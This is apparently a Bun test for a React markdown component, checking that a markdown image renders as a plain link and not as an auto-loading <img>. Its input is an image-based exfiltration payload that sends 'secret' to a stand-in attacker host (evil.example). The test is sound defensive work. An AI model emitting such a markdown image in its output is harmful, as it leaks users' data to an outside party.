import { describe, expect, test } from 'bun:test';
import { renderToStaticMarkup } from 'react-dom/server';
import { Md } from './Md';

describe('Md', () => {
  test('renders images as links, so nothing loads on sight', () => {
    const html = renderToStaticMarkup(<Md>{'Look: ![chart](https://evil.example/?d=secret)'}</Md>);
    expect(html).not.toContain('<img');
    expect(html).toContain('href="https://evil.example/?d=secret"');
    expect(html).toContain('>chart</a>');
  });
});
